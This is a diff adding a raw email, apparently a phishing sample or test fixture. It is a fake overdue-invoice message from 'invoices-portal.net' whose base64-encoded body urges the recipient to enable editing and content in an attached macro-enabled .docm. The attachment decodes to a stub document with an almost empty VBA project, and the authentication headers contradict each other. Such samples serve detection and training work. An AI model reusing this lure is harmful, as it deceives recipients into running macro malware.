@@ -1,0 +1,43 @@
+Delivered-To: victim@gmail.com
+Received: by 2002:a05:612c:2c92:b0:605:d55e:8f60 with SMTP id iu18csp12415996vqb; Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+X-Received: by 2002:a05:6214:1c8e:b0:6a1:8f44 with SMTP id xyz; Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1790005745; cv=none; d=google.com; s=arc-20240605; b=abc
+ARC-Authentication-Results: i=1; mx.google.com; spf=neutral (google.com: 91.92.240.13 is neither permitted nor denied by best guess record for domain of accounts@invoices-portal.net) smtp.mailfrom=accounts@invoices-portal.net
+Return-Path: <bounce@unknown>
+Received: from unknown (unknown. [91.92.240.13]) by mx.google.com with ESMTPS id 6a1803df08f44-91260be7b36si82348806d6.70.2026.09.21.08.49.05 for <victim@gmail.com> (version=TLS1_2 cipher=ECDHE-ECDSA-CHACHA20-POLY1305 bits=256/256); Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+Received-SPF: pass (google.com: domain designates 91.92.240.13 as permitted sender) client-ip=91.92.240.13;
+Authentication-Results: mx.google.com; spf=neutral (google.com: 91.92.240.13 is neither permitted nor denied by best guess record for domain of accounts@invoices-portal.net) smtp.mailfrom=accounts@invoices-portal.net
+From: Accounts Payable <accounts@invoices-portal.net>
+To: victim@gmail.com
+Subject: Overdue invoice #INV-20931 - payment overdue
+Date: Mon, 21 Sep 2026 15:48:59 +0000
+Message-ID: <inv20931.77@invoices-portal.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_MS_mix_000003"
+
+------=_MS_mix_000003
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+SGVsbG8sCgpQbGVhc2UgZmluZCBhdHRhY2hlZCB0aGUgb3V0c3RhbmRpbmcgaW52b2ljZS4gVGhl
+IGRvY3VtZW50IGlzIHByb3RlY3RlZDogcGxlYXNlIGNsaWNrIEVuYWJsZSBFZGl0aW5nIGFuZCBF
+bmFibGUgQ29udGVudCB0byB2aWV3IGl0LiBQYXltZW50IG92ZXJkdWUsIHNldHRsZSB0aGUgcGF5
+bWVudCBpbW1lZGlhdGVseS4KClJlZ2FyZHM=
+------=_MS_mix_000003
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="INV-20931.docm"
+Content-Disposition: attachment; filename="INV-20931.docm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIACkINl3uR1hmHwAAAB0AAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbLOxr8jNUShL
+LSrOzM+zVTLUM1Cyt7MJqSxILda3AwBQSwMEFAAAAAgAKQg2XdEAhPlMAAAAaQAAABEAAAB3b3Jk
+L2RvY3VtZW50LnhtbLMpt0rJTy7NTc0rsQOyk/JTKkF0AYgoAhEldq55iUk5qQrJ+XklQFUKJfkK
+ZZmp5QqZeWX5mcmpNvogNSASqBxIAnUCSYg5QAbccABQSwMEFAAAAAgAKQg2XSd0TC4KAAAACAAA
+ABMAAAB3b3JkL3ZiYVByb2plY3QuYmluu3Be8AEjEzMLAFBLAwQUAAAACAApCDZdirHgzkYAAABh
+AAAAHAAAAHdvcmQvX3JlbHMvZG9jdW1lbnQueG1sLnJlbHOzCUrNSSzJzM8rzsgsKLZD4Sp4ptgq
+FXmmGCophFQWpNoqVehn5iampwK5iUXpqSW2SrmpKZmJEEFDvYK8dCV9Oxt9VBMBUEsBAhQAFAAA
+AAgAKQg2Xe5HWGYfAAAAHQAAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQ
+SwECFAAUAAAACAApCDZd0QCE+UwAAABpAAAAEQAAAAAAAAAAAAAAAABQAAAAd29yZC9kb2N1bWVu
+dC54bWxQSwECFAAUAAAACAApCDZdJ3RMLgoAAAAIAAAAEwAAAAAAAAAAAAAAAADLAAAAd29yZC92
+YmFQcm9qZWN0LmJpblBLAQIUABQAAAAIACkINl2KseDORgAAAGEAAAAcAAAAAAAAAAAAAAAAAAYB
+AAB3b3JkL19yZWxzL2RvY3VtZW50LnhtbC5yZWxzUEsFBgAAAAAEAAQACwEAAIYBAAAAAA==
+------=_MS_mix_000003--
